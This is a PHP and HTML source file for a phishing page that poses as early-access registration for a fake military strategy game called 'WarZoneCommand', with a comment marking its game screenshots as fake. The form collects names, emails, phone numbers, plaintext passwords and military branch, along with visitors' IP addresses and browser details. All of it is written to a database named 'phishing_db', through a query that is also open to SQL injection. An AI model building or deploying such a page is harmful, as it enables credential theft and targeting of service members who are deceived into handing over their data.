<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = $_POST['name'];
    $email = $_POST['email'];
    $phone = $_POST['phone'];
    $password = $_POST['password'];
    $military_branch = $_POST['military_branch'];
    
    // Capture IP and device details
    $ip_address = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    // Database connection
    $conn = new mysqli("localhost", "root", "", "phishing_db");

    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    $sql = "INSERT INTO phishing_data (name, email, phone, password, military_branch, ip_address, user_agent)
            VALUES ('$name', '$email', '$phone', '$password', '$military_branch', '$ip_address', '$user_agent')";

    if ($conn->query($sql) === TRUE) {
        header("Location: thank_you.php");
    } else {
        echo "Error: " . $conn->error;
    }

    $conn->close();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register - WarZoneCommand</title>
    <link rel="stylesheet" href="css/styles.css">
    <!-- Google Fonts for a professional look -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&family=Oswald:wght@400;700&display=swap" rel="stylesheet">
</head>
<body>
    <!-- Registration Page Section -->
    <div class="registration-page">
        <!-- Background Image with Parallax Effect -->
        <div class="background-image">
            <img src="images/i3.png" alt="Tactical War Map" class="reg-bg-img">
        </div>

        <!-- Form Container with Card Styling -->
        <div class="form-container">
            <h2>Register for Early Access</h2>
            <p class="subheading">Join the battlefield, command your army!</p>

            <!-- Registration Form -->
            <form action="" method="POST">
                <div class="input-group">
                    <label for="name">Full Name</label>
                    <input type="text" name="name" id="name" placeholder="Enter your full name" required>
                </div>

                <div class="input-group">
                    <label for="email">Email</label>
                    <input type="email" name="email" id="email" placeholder="Enter your email" required>
                </div>

                <div class="input-group">
                    <label for="phone">Phone Number</label>
                    <input type="text" name="phone" id="phone" placeholder="Enter your phone number" required>
                </div>

                <div class="input-group">
                    <label for="password">Create Password</label>
                    <input type="password" name="password" id="password" placeholder="Create a secure password" required>
                </div>

                <div class="input-group">
                    <label for="military_branch">Military Branch</label>
                    <select name="military_branch" id="military_branch" required>
                        <option value="Army">Army</option>
                        <option value="Navy">Navy</option>
                        <option value="Air Force">Air Force</option>
                    </select>
                </div>

                <button type="submit" class="btn">Register Now</button>
            </form>
        </div>

        <!-- Fake Game Screenshots Section -->
        <div class="screenshots">
            <h3>Explore the Game Screenshots</h3>
            <div class="screenshot-container">
                <img src="images/i1.png" alt="Game Screenshot 1">
                <img src="images/i2.png" alt="Game Screenshot 2">
            </div>
        </div>
    </div>
</body>
</html>
